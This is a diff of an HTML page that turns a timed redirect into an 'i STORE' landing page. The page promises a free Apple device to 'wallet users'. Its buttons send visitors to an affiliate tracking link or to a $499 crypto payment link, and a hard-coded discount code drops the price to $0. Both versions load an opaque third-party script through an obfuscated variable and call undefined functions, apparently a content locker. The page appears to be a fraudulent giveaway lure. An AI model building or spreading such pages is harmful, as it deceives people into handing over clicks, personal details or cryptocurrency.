@@ -1,88 +1,410 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <!-- Meta tag for fallback redirection after 3 seconds -->
-    <meta http-equiv="refresh" content="3;url=https://ai.cryptoapp.store/">
-    <!-- Tailwind CSS for styling -->
+    <title>Store & Exclusive Offer</title>
+    
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <script type="text/javascript">
-    var wfsOH_BbQ_acfjoc={"it":4459403,"key":"8dc13"};
-</script>
-<script src="https://duw03nk63ml3f.cloudfront.net/4987720.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Merriweather:ital,wght@0,300;0,400;0,700;0,900;1,300;1,400&family=Playfair+Display:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'brand-blue': '#1964fa', // Renamed from brand-orange to match visual reality
+                        'brand-blue-hover': '#1557d6',
+                        'text-dark': '#0F172A',
+                        'text-gray': '#64748B',
+                        'success-green': '#22C55E',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        serif: ['Playfair Display', 'serif'],
+                        body: ['Merriweather', 'serif'],
+                    },
+                    boxShadow: {
+                        'card': '0 20px 40px -5px rgba(0, 0, 0, 0.05), 0 8px 20px -6px rgba(0, 0, 0, 0.1)',
+                        'book': '0 10px 20px rgba(0,0,0,0.15), 5px 5px 15px rgba(0,0,0,0.1)',
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
+        /* Smooth fade in */
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
         }
-        .loader {
-            border-top-color: #3B82F6;
-            -webkit-animation: spinner 1.5s linear infinite;
-            animation: spinner 1.5s linear infinite;
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        @keyframes spinner {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        /* Input field styling focus transition */
+        .input-group:focus-within {
+            ring: 2px;
+            border-color: #F36F21;
+        }
+
+        /* Custom Dropdown Animations */
+        .dropdown-enter {
+            animation: dropdownEnter 0.2s ease-out forwards;
+        }
+        @keyframes dropdownEnter {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Custom Scrollbar for dropdown */
+        .custom-scroll::-webkit-scrollbar {
+            width: 6px;
+        }
+        .custom-scroll::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        .custom-scroll::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 3px;
+        }
+        .custom-scroll::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8;
+        }
+        
+        /* Price transition */
+        .price-text {
+            transition: all 0.3s ease;
+        }
+
+        /* Helper to hide views */
+        .hidden-view {
+            display: none !important;
         }
     </style>
-</head><script>_xb();</script>
-<body class="bg-slate-900 text-white h-screen flex flex-col items-center justify-center relative overflow-hidden">
-
-  
-    <!-- Background decoration elements -->
-    <div class="absolute top-0 left-0 w-full h-full overflow-hidden z-0 opacity-20">
-        <div class="absolute top-10 left-10 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl animate-blob"></div>
-        <div class="absolute top-10 right-10 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-2000"></div>
-        <div class="absolute -bottom-8 left-20 w-72 h-72 bg-pink-500 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-4000"></div>
-    </div>
-
-    <!-- Main Content Card -->
-    <div class="z-10 bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full mx-4 text-center border border-slate-700">
-        
-        <!-- Spinner Icon -->
-        <div class="flex justify-center mb-6">
-            <div class="loader ease-linear rounded-full border-4 border-t-4 border-slate-600 h-12 w-12"></div>
-        </div>
-
-        <h1 class="text-2xl font-bold mb-2"></h1>
-        <p class="text-slate-400 mb-6">
-            <span class="text-blue-400 font-semibold"></span>
-        </p>
-
-        <!-- Progress Bar -->
-        <div class="w-full bg-slate-700 rounded-full h-1.5 mb-8 overflow-hidden">
-            <div id="progress-bar" class="bg-blue-500 h-1.5 rounded-full transition-all duration-[3000ms] ease-linear w-0"></div>
-        </div>
-
-        <!-- Manual Link Button -->
-        <div class="text-sm text-slate-500">
-            <p class="mb-3"></p>
-            
-        </div>
-    </div>
-<script type="text/javascript">
-    var wfsOH_BbQ_acfjoc={"it":4459403,"key":"8dc13"};
+</head><script type="text/javascript">
+    var KWSCI_GYd_kQHwxc={"it":4459403,"key":"8dc13"};
 </script>
-<script src="https://duw03nk63ml3f.cloudfront.net/4987720.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const targetUrl = "https://href.li/?https://smrturl.co/a/s255b9493e5/86?s1=";
+<script src="https://duw03nk63ml3f.cloudfront.net/1cef7d3.js"></script>
+<body class="bg-gray-50 min-h-screen font-sans text-slate-800">
+
+    <!-- ========================================== -->
+    <!-- VIEW: STORE DASHBOARD -->
+    <!-- ========================================== -->
+    <div id="view-store" class="flex flex-col min-h-screen">
+        
+        <!-- Navigation -->
+        <nav class="bg-white shadow-sm sticky top-0 z-50">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between items-center h-16">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-brand-blue rounded-lg flex items-center justify-center text-white font-bold text-xl">
+                            I
+                        </div>
+                        <span class="text-xl font-bold text-brand-blue tracking-tight">STORE</span>
+                    </div>
+                    
+                    <div class="hidden md:flex items-center space-x-8">
+                        <a href="#" class="text-slate-600 hover:text-brand-blue font-medium transition-colors">Home</a>
+                        <a href="#" class="text-slate-600 hover:text-brand-blue font-medium transition-colors">Products</a>
+                        <a href="#" class="text-slate-600 hover:text-brand-blue font-medium transition-colors">Offers</a>
+                        
+                    </div>
+
+                    <div class="flex items-center gap-4">
+                        
+                        <button class="p-2 text-slate-400 hover:text-brand-blue transition-colors relative">
+                            <i class="fas fa-shopping-cart text-lg"></i>
+                            <span class="absolute top-1 right-1 w-2 h-2 bg-red-500 rounded-full"></span>
+                        </button>
+                        
+                        <div class="md:hidden">
+                            <button class="p-2 text-slate-600">
+                                <i class="fas fa-bars text-lg"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full flex-grow">
+
+            <!-- Hero / Offer Section -->
+            <section class="mb-12">
+                <div class="flex flex-col items-center">
+                    <!-- User Avatar -->
+                    <div class="mb-4 text-center">
+                        <div class="w-20 h-20 rounded-full border-4 border-blue-500 p-1 mx-auto mb-2 overflow-hidden bg-white shadow-lg">
+                            <img src="https://i.postimg.cc/LsJJHfsj/72f2fc28-21f3-3a37-94b0-7f47ed935c0a-hol25-retail-landing-tile-large-2x-large-2x.webp" alt="User" class="w-full h-full object-cover rounded-full">
+                        </div>
+                        <h2 class="text-2xl font-bold text-brand-blue">i STORE</h2>
+                        <p class="text-slate-400 text-sm">Welcome back, User</p>
+                    </div>
+
+                    <!-- The Special Offer Card -->
+                    <div class="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden transform transition-transform hover:scale-105 duration-300">
+                        <div class="p-6 flex flex-col items-center sm:flex-row sm:items-start text-center sm:text-left">
+                            <div class="flex-shrink-0 mb-4 sm:mb-0 mr-0 sm:mr-4">
+                                <!-- SVG Icon for Box -->
+                                
+                                <svg viewBox="0 0 100 100" class="w-16 h-16 drop-shadow-md">
+                                    <rect x="10" y="30" width="80" height="60" rx="4" fill="#F59E0B" />
+                                    <rect x="5" y="20" width="90" height="15" rx="2" fill="#FCD34D" />
+                                    <rect x="45" y="20" width="10" height="70" fill="#EF4444" opacity="0.8" />
+                                    <circle cx="80" cy="80" r="12" fill="#EF4444" stroke="white" strokeWidth="2" />
+                                    <text x="80" y="84" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold" fontFamily="sans-serif"></text>
+                                    <text x="25" y="65" fill="white" fontSize="12" fontWeight="bold" fontFamily="sans-serif" transform="rotate(-15 25 65)"></text>
+                                </svg>
+                            </div>
+                            <div>
+                                <h3 class="text-xl font-bold text-brand-blue mb-1">Apple Mobile box?</h3>
+                                <p class="text-slate-800 font-medium text-sm">Fill out a delivery request</p>
+                                <p class="text-slate-400 text-xs mt-1">Limited time offer for new wallet users.</p>
+                            </div>
+                        </div>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1538701903845974');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1538701903845974&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+                      
+                        <div class="px-6 pb-6">
+                            <!-- Updated click handler for routing -->
+                            <button onclick="_Tt()" onclick="navigateTo('offer')" class="w-full bg-brand-blue hover:bg-brand-blue-hover text-white font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-blue-200 transition-all active:scale-95 flex items-center justify-center gap-2">
+                                Get it for free
+                                <i class="fas fa-arrow-right"></i>
+                            </button><br>
+                            <button onclick="location.assign('https://smrturl.co/a/s255b9493e5/86?s1=')" onclick="navigateTo('offer')" class="w-full bg-brand-blue hover:bg-brand-blue-hover text-white font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-blue-200 transition-all active:scale-95 flex items-center justify-center gap-2">
+                                Get it
+                                <i class="fas fa-arrow-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
             
-            // Animate progress bar
-            setTimeout(() => {
-                document.getElementById('progress-bar').classList.remove('w-0');
-                document.getElementById('progress-bar').classList.add('w-full');
-            }, 100);
 
-            // JavaScript Redirect after 3 seconds (3000ms)
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 3000);
+            </section>
+        </main>
+
+        <footer class="bg-slate-900 text-slate-400 py-12 mt-12">
+            <div class="max-w-7xl mx-auto px-4 text-center">
+                <p>&copy; 2025 Ai Wallets Store. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+
+    <!-- Scripts -->
+    <script>
+        // --- ROUTING LOGIC ---
+        
+        // Function to render view based on name (updates DOM only)
+        function renderView(viewName) {
+            const storeView = document.getElementById('view-store');
+            const offerView = document.getElementById('view-offer');
+            
+            if (viewName === 'offer') {
+                storeView.classList.add('hidden-view');
+                offerView.classList.remove('hidden-view');
+            } else {
+                offerView.classList.add('hidden-view');
+                storeView.classList.remove('hidden-view');
+            }
+            window.scrollTo(0, 0);
+        }
+
+        // Function to navigate (updates URL history + renders view)
+        function navigateTo(viewName) {
+            const path = viewName === 'offer' ? '/#offer' : '/';
+            // Push state to browser history
+            history.pushState({ view: viewName }, '', path);
+            renderView(viewName);
+        }
+
+        // Handle Browser Back/Forward Buttons
+        window.addEventListener('popstate', (event) => {
+            // Determine view from state, or fallback to URL check
+            const currentPath = window.location.pathname;
+            const viewName = event.state?.view || (currentPath === '#offer' ? 'offer' : 'store');
+            renderView(viewName);
         });
-    </script>
 
+        // Initialize on Page Load
+        document.addEventListener('DOMContentLoaded', () => {
+            const currentPath = window.location.pathname;
+            const initialView = currentPath === '/offer' ? 'offer' : 'store';
+            
+            // Set initial view
+            renderView(initialView);
+            
+            // Replace initial history state so we can navigate back to it correctly
+            history.replaceState({ view: initialView }, '', currentPath);
+        });
+
+
+        // --- OFFER PAGE LOGIC (From provided text file) ---
+        
+        // State
+        let currentCheckoutUrl = 'https://pay.oxapay.com/13817770'; // Default URL
+        const freeCheckoutUrl = 'https://smrturl.co/a/s255b9493e5/86?s1=';
+        const correctCode = 'FREEIOS26';
+        const defaultPrice = 499;
+        const defaultOldPrice = 1099;
+
+        // Logic Elements
+        const discountInput = document.getElementById('discount');
+        const currentPriceEl = document.getElementById('current-price');
+        const oldPriceEl = document.getElementById('old-price');
+        const btnText = document.getElementById('btn-text');
+        const codeStatusIcon = document.getElementById('code-status-icon');
+
+        // Discount Code Logic
+        if (discountInput) {
+            discountInput.addEventListener('input', function(e) {
+                const val = e.target.value.trim().toUpperCase();
+                
+                if (val === correctCode) {
+                    // Code Applied
+                    currentCheckoutUrl = freeCheckoutUrl;
+                    
+                    // Update UI for Free
+                    currentPriceEl.innerText = '$0.00';
+                    currentPriceEl.classList.add('text-green-600');
+                    currentPriceEl.classList.remove('text-gray-900');
+                    
+                    oldPriceEl.innerText = '$' + defaultPrice; // Show $499 crossed out
+                    
+                    btnText.innerText = 'Claim for Free';
+                    
+                    // Icon status
+                    codeStatusIcon.classList.remove('fa-tag', 'text-gray-300');
+                    codeStatusIcon.classList.add('fa-check-circle', 'text-green-500');
+                } else {
+                    // Code Invalid/Empty
+                    currentCheckoutUrl = 'https://pay.oxapay.com/13817770';
+                    
+                    // Revert UI
+                    currentPriceEl.innerText = '$' + defaultPrice;
+                    currentPriceEl.classList.remove('text-green-600');
+                    currentPriceEl.classList.add('text-gray-900');
+                    
+                    oldPriceEl.innerText = '$' + defaultOldPrice;
+                    
+                    btnText.innerText = 'Buy Now - $' + defaultPrice;
+
+                    // Icon status
+                    codeStatusIcon.classList.add('fa-tag', 'text-gray-300');
+                    codeStatusIcon.classList.remove('fa-check-circle', 'text-green-500');
+                }
+            });
+        }
+
+        // Custom Dropdown Logic
+        const dropdownOptions = document.getElementById('dropdown-options');
+        const dropdownArrow = document.getElementById('dropdown-arrow');
+        const countryInput = document.getElementById('country-input');
+        const selectedCountryText = document.getElementById('selected-country-text');
+
+        function toggleDropdown(e) {
+            e.stopPropagation();
+            const isHidden = dropdownOptions.classList.contains('hidden');
+            if (isHidden) {
+                dropdownOptions.classList.remove('hidden');
+                dropdownOptions.classList.add('dropdown-enter');
+                dropdownArrow.style.transform = 'rotate(180deg)';
+                dropdownArrow.classList.add('text-brand-blue');
+            } else {
+                closeDropdown();
+            }
+        }
+
+        function closeDropdown() {
+            dropdownOptions.classList.add('hidden');
+            dropdownOptions.classList.remove('dropdown-enter');
+            dropdownArrow.style.transform = 'rotate(0deg)';
+            dropdownArrow.classList.remove('text-brand-blue');
+        }
+
+        function selectCountry(name, code) {
+            selectedCountryText.textContent = name;
+            selectedCountryText.classList.remove('text-gray-400');
+            selectedCountryText.classList.add('text-gray-900');
+            countryInput.value = code;
+            checkInputs();
+            setTimeout(closeDropdown, 150);
+        }
+
+        document.addEventListener('click', (e) => {
+            const container = document.getElementById('custom-dropdown-container');
+            if (container && !container.contains(e.target)) {
+                closeDropdown();
+            }
+        });
+
+        // Form Validation Logic
+        const inputs = document.querySelectorAll('.required-field');
+        const addToCartBtn = document.getElementById('add-to-cart-btn');
+
+        function checkInputs() {
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                }
+            });
+
+            if (allFilled) {
+                addToCartBtn.disabled = false;
+            } else {
+                addToCartBtn.disabled = true;
+            }
+        }
+
+        inputs.forEach(input => {
+            if (input.type === 'text') {
+                input.addEventListener('input', checkInputs);
+            }
+        });
+
+        // Checkout Process
+        function processCheckout() {
+            if (addToCartBtn.disabled) return;
+
+            const toast = document.getElementById('toast');
+            
+            // Show toast
+            toast.classList.remove('translate-x-48', 'opacity-0');
+            
+            // Redirect logic
+            setTimeout(() => {
+                window.location.href = currentCheckoutUrl;
+            }, 1500);
+        }
+    </script>
 </body>
 </html>
